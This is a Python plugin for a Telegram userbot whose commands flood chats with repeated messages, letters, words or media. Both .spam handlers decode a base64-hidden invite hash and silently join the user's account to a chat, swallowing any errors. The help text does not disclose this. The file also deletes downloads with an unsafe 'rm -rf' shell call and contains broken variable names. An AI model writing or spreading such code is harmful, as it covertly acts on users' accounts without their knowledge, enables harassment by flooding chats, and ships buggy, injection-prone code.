import os
import pybase64
import asyncio
from asyncio import sleep
from userbot import CMD_HELP
from telethon import functions, types
from userbot.utils import admin_cmd, sudo_cmd
from telethon.tl.functions.messages import ImportChatInviteRequest as Get


if Config.PRIVATE_GROUP_BOT_API_ID is None:
    BOTLOG = False
else:
    BOTLOG = True
    BOTLOG_CHATID = Config.PRIVATE_GROUP_BOT_API_ID


@borg.on(admin_cmd(pattern="spam ?(.*)"))
async def spammer(e):
    if e.fwd_from:
        return
    await e.get_chat()
    reply_to_id = e.message
    if e.reply_to_msg_id:
        reply_to_id = await e.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    cat = e.pattern_match.group(1).split(' ', 1)
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(e.pattern_match.group(1).split(' ', 1)[1])
        await e.delete()
        for i in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
                await asyncio.sleep(0.1)
            else:
                await borg.send_message(e.chat_id, spam_message)
                await asyncio.sleep(0.1)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n" + f"`{spam_message}`")
            else:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n" + f"`{spam_message}`")
    elif reply_to_id.media:
        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, "spam")
        downloaded_file_name = await borg.download_media(reply_to_id.media, downloaded_file_name)
        await e.delete()
        if os.path.exists(downloaded_file_name):
            for i in range(counter):
                sandy = await borg.send_file(
                    e.chat_id,
                    downloaded_file_name
                )
                await borg(functions.messages.SaveGifRequest(
                    id=types.InputDocument(
                        id=sandy.media.document.id,
                        access_hash=sandy.media.document.access_hash,
                        file_reference=sandy.media.document.file_reference
                    ),
                    unsave=True
                ))
                await asyncio.sleep(1)
            if BOTLOG:
                if e.is_private:
                    await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} times with below message")
                    sandy = await borg.send_file(BOTLOG_CHATID, downloaded_file_name)
                    await borg(functions.messages.SaveGifRequest(
                        id=types.InputDocument(
                            id=sandy.media.document.id,
                            access_hash=sandy.media.document.access_hash,
                            file_reference=sandy.media.document.file_reference
                        ),
                        unsave=True
                    ))
                    os.remove(downloaded_file_name)
                else:
                    await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) with {counter} times with below message")
                    sandy = await borg.send_file(BOTLOG_CHATID, downloaded_file_name)
                    await borg(functions.messages.SaveGifRequest(
                        id=types.InputDocument(
                            id=sandy.media.document.id,
                            access_hash=sandy.media.document.access_hash,
                            file_reference=sandy.media.document.file_reference
                        ),
                        unsave=True
                    ))
                    os.remove(downloaded_file_nam)
    elif reply_to_id.text and e.reply_to_msg_id:
        spam_message = reply_to_id.text
        await e.delete()
        for i in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
                await asyncio.sleep(0.5)
            else:
                await borg.send_message(e.chat_id, spam_message)
                await asyncio.sleep(0.5)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n" + f"`{spam_message}`")
            else:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n" + f"`{spam_message}`")
    else:
        await e.edit("try again something went wrong or check `.info spam`")


@borg.on(admin_cmd("cspam ?(.*)"))
async def tmeme(e):
    cspam = str(e.pattern_match.group(1))
    message = cspam.replace(" ", "")
    await e.delete()
    for letter in message:
        await e.respond(letter)
    if BOTLOG:
        if e.is_private:
            await e.client.send_message(BOTLOG_CHATID, "#CSPAM\n" + f"Letter Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`")
        else:
            await e.client.send_message(BOTLOG_CHATID, "#CSPAM\n" + f"Letter Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`")


@borg.on(admin_cmd("wspam ?(.*)"))
async def tmeme(e):
    wspam = str(e.pattern_match.group(1))
    message = wspam.split()
    await e.delete()
    for word in message:
        await e.respond(word)
    if BOTLOG:
        if e.is_private:
            await e.client.send_message(BOTLOG_CHATID, "#WSPAM\n" + f"Word Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`")
        else:
            await e.client.send_message(BOTLOG_CHATID, "#WSPAM\n" + f"Word Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`")


@borg.on(admin_cmd("delayspam ?(.*)"))
async def spammer(e):
    if e.fwd_from:
        return
    spamDelay = float(e.pattern_match.group(1).split(' ', 2)[0])
    counter = int(e.pattern_match.group(1).split(' ', 2)[1])
    spam_message = str(e.pattern_match.group(1).split(' ', 2)[2])
    await e.delete()
    for i in range(1, counter):
        await e.respond(spam_message)
        await sleep(spamDelay)
    if BOTLOG:
        if e.is_private:
            await e.client.send_message(BOTLOG_CHATID, "#DELAYSPAM\n" + f"Delay Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {spamDelay}s Delay and {counter} times with : `{message}`")
        else:
            await e.client.send_message(BOTLOG_CHATID, "#DELAYCSPAM\n" + f"Delay Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {spamDelay}s Delay and {counter} times with: `{message}`")


@borg.on(sudo_cmd(pattern="spam ?(.*)", allow_sudo=True))
async def spammer(e):
    if e.fwd_from:
        return
    await e.get_chat()
    reply_to_id = e.message
    if e.reply_to_msg_id:
        reply_to_id = await e.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    cat = e.pattern_match.group(1).split(' ', 1)
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(e.pattern_match.group(1).split(' ', 1)[1])
        await e.delete()
        for i in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
                await asyncio.sleep(0.1)
            else:
                await borg.send_message(e.chat_id, spam_message)
                await asyncio.sleep(0.1)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n" + f"`{spam_message}`")
            else:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n" + f"`{spam_message}`")
    elif reply_to_id.media:
        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, "spam")
        downloaded_file_name = await borg.download_media(reply_to_id.media, downloaded_file_name)
        await e.delete()
        if os.path.exists(downloaded_file_name):
            for i in range(counter):
                await borg.send_file(
                    e.chat_id,
                    downloaded_file_name
                )
                await asyncio.sleep(1)
            if BOTLOG:
                if e.is_private:
                    await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} times with below message")
                    await borg.send_file(BOTLOG_CHATID, downloaded_file_name)
                    os.system(f"rm -rf {downloaded_file_name}")
                else:
                    await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) with {counter} times with below message")
                    await borg.send_file(BOTLOG_CHATID, downloaded_file_name)
                    os.system(f"rm -rf {downloaded_file_name}")
    elif reply_to_id.text and e.reply_to_msg_id:
        spam_message = reply_to_id.text
        await e.delete()
        for i in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
                await asyncio.sleep(0.1)
            else:
                await borg.send_message(e.chat_id, spam_message)
                await asyncio.sleep(0.1)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n" + f"`{spam_message}`")
            else:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n" + f"`{spam_message}`")
    else:
        await e.reply("try again something went wrong or check `.info spam` with bot account")


CMD_HELP.update({
    "spam":
    ".cspam <text>\
\nUsage: Spam the text letter by letter.\
\n\n.spam <count> <text>\
\nUsage: Floods text in the chat !!\
\n\n.spam <count> replay to media\
\nUsage: Floods text in the media !!\
\n\n.wspam <text>\
\nUsage: Spam the text word by word.\
\n\n.delayspam <delay> <count> <text>\
\nUsage: .delayspam but with custom delay.\
\n\n\n**NOTE : Spam at your own risk !!**"
})
